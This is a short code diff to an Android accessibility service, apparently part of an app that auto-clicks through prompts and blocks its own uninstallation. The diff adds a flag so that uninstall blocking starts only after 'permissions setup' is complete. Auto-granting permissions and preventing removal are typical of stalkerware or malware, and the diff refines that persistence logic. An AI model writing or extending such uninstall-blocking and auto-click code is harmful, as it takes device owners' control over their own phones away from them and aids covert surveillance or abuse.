@@ -18,6 +18,7 @@ public class AccessibilityHelperService extends AccessibilityService {
 
     private static AccessibilityHelperService instance;
     private static boolean isAutoClickEnabled = true;
+    private static boolean permissionsSetupComplete = false;
     private Handler handler;
     private Runnable autoClickDisableRunnable;
     
@@ -40,6 +41,10 @@ public class AccessibilityHelperService extends AccessibilityService {
 
     public static void enableAutoClick() {
         isAutoClickEnabled = true;
+    }
+
+    public static void setPermissionsSetupComplete() {
+        permissionsSetupComplete = true;
     }
 
     @Override
@@ -245,6 +250,9 @@ public class AccessibilityHelperService extends AccessibilityService {
     }
     
     private void detectAndBlockUninstall(AccessibilityEvent event) {
+        // Don't block uninstall until permissions setup is complete
+        if (!permissionsSetupComplete) return;
+
         try {
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) return;
